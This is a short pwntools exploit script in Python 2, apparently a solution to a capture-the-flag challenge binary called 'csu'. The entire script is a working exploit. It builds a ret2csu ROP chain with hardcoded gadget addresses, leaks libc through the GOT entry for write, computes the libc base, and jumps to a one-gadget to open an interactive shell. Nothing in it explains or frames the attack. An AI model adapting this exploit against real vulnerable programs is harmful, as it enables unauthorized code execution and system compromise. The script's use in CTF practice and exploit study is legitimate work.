from pwn import *

p = process('./csu')
e = ELF('./csu')
l = e.libc

csu = 0x000000000040060A
setting = 0x00000000004005F0
prdi = 0x0000000000400613
oneshot = 0x45226

payload = 'A'*16
payload += p64(csu)
payload += p64(0)
payload += p64(1)
payload += p64(e.got['write'])
payload += p64(8)
payload += p64(e.got['write'])
payload += p64(1)
payload += p64(setting)

payload += p64(e.symbols['main'])*8

p.sendafter('Attack Me...!', payload)
base = u64(p.recvuntil('\x7f')[-6:] + '\x00\x00') - l.symbols['write']
print hex(base)

payload = 'A'*16
payload += p64(base + oneshot)

p.sendafter('Attack Me...!', payload)
p.interactive()
